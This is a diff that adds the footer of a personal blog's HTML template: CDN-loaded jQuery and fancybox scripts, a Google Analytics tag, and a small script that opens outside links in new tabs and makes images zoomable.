+<a href="#" id="go-top">Top ↑</a>
+<script src="https://cdn.staticfile.org/jquery/1.12.4/jquery.min.js"></script>
+<script src="https://cdn.staticfile.org/jquery.appear/0.4.1/jquery.appear.min.js"></script>
+<script src="../static/deep/js/common_tpl.js" type="text/javascript"></script>
+<script src="../static/deep/js/config.js"></script>
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-FF5KPQ1CZ6"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-FF5KPQ1CZ6');
+</script>
+
+<script src="https://cdn.staticfile.org/fancybox/2.1.7/js/jquery.fancybox.min.js"></script>
+<script>
+$(document).ready(function () {
+    $(".entry a").each(function (i, e) {
+        if(e.host != 'www.leavesongs.com') {
+            e.target = '_blank';
+        }
+    });
+    $(".entry img").each(function (i, e) {
+        if(e.parentNode.tagName.toUpperCase() != 'A') {
+            $(e).wrap('<a href="'+escapeHtml(e.src)+'" class="fancybox"></a>');
+        } else {
+            $(e.parentNode).addClass('fancybox');
+        }
+    });
+    $('.fancybox').fancybox();
+})
+</script>
+
+</body>
+
+</html>
